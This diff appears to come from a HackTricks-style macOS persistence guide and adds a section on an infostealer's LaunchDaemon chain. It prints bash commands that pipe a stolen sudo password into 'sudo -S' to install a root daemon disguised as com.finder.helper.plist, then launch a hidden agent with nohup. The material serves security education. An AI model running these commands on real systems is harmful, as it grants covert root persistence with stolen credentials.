@@ -88,6 +88,21 @@ List all the agents and daemons loaded by the current user:
 launchctl list
 ```
 
+#### Example malicious LaunchDaemon chain (password reuse)
+
+A recent macOS infostealer reused a **captured sudo password** to drop a user agent and a root LaunchDaemon:
+
+- Write the agent loop to `~/.agent` and make it executable.
+- Generate a plist in `/tmp/starter` pointing to that agent.
+- Reuse the stolen password with `sudo -S` to copy it into `/Library/LaunchDaemons/com.finder.helper.plist`, set `root:wheel`, and load it with `launchctl load`.
+- Start the agent silently via `nohup ~/.agent >/dev/null 2>&1 &` to detach output.
+
+```bash
+printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
+printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
+printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
+nohup "$HOME/.agent" >/dev/null 2>&1 &
+```
 > [!WARNING]
 > If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.
 
@@ -1792,6 +1807,10 @@ RunService ()
 
 - [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
 - [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)
+
+## References
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../banners/hacktricks-training.md}}
 
